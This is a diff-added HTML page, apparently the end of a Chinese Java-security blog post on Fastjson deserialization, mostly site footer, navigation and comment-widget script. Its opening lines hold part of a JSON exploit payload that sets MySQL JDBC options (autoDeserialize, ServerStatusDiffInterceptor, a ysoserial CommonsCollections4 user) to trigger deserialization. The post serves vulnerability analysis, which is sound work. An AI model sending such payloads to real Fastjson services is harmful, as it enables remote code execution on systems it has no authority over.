+            <span class="token property">"port"</span><span class="token operator">:</span><span class="token string">"3306"</span><span class="token punctuation">,</span>          
+            <span class="token property">"user"</span><span class="token operator">:</span><span class="token string">"yso_CommonsCollections4_calc"</span><span class="token punctuation">,</span>
+            <span class="token property">"dbname"</span><span class="token operator">:</span><span class="token string">"dbname"</span><span class="token punctuation">,</span>
+            <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"pass"</span><span class="token punctuation">,</span>
+            <span class="token property">"queryInterceptors"</span><span class="token operator">:</span><span class="token string">"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span><span class="token punctuation">,</span>
+            <span class="token property">"autoDeserialize"</span><span class="token operator">:</span><span class="token string">"true"</span>
+         <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+    
+    <div class="post__license">
+        <p>
+            <strong>Author: </strong>wileysec
+        </p>
+        <p>
+            <strong>
+                Permalink: 
+            </strong>
+            <a href="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html">https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html</a>
+        </p>
+        
+    </div>
+ 
+    <div class="post-footer__meta"><p>文章更新于 2023-08-26</p></div> 
+    <div class="post-entry__tags"><a href="/tags/Java%E5%AE%89%E5%85%A8/" class="post-tags__link button"># Java安全</a><a href="/tags/Fastjson/" class="post-tags__link button"># Fastjson</a><a href="/tags/alibaba/" class="post-tags__link button"># alibaba</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/91ba9d0d39fd.html" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            Previous Post
+                        </div>
+                        <div class="nav__title">
+                            Log4j2反序列化利用与分析
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/11c62fd672b4.html" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            Fastjson&lt;=1.2.24反序列化分析
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2023 <a href="/">Wileysec&#39;s Blog</a>
+        </p>
+    
+    
+    <p><a href="https://beian.miit.gov.cn/" target="_blank">皖ICP备18006273号-1</a></p>
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+    <p></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('false')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"GwvNoIVYwbmwRKo2fr9bcJHp-gzGzoHsz","appKey":"9olsAGq7SGWYUVcmI5RDrXid","placeholder":"请佬们指正","path":null,"avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":["zh-CN","en","zh-TW"],"visitor":null,"highlight":null,"avatarForce":null,"recordIP":true,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
